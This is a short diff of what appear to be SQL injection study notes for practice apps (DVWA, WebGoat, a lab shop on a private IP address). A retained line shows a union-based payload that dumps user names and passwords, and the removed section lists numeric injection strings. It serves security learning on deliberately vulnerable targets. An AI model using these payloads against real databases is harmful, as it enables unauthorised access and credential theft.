@@ -24,18 +24,6 @@ Examples on [DVWA](http://owasp.local/dvwa/vulnerabilities/sqli/)
 1' and 1=0 union select null, concat(first_name,0x20,last_name,0x3a,user,0x3a,password) from users #
 ```
 
-
-### Numeric
-
-Examples on [WebGoat](http://10.6.6.13:8080/WebGoat-5.4/attack?Screen=77&menu=1100)
-
-```
-SUBMIT=Go%21&station=102%2b1
-SUBMIT=Go%21&station=102 or 1=1
-SUBMIT=Go%21&station=102 ORDER BY 7
-SUBMIT=Go%21&station=102 union select 1,null,user(),null,null from weather_data
-```
-
 Examples on ["AwesomeShop"](http://10.6.6.13/oc/)
 
 Confirmation of SQLi
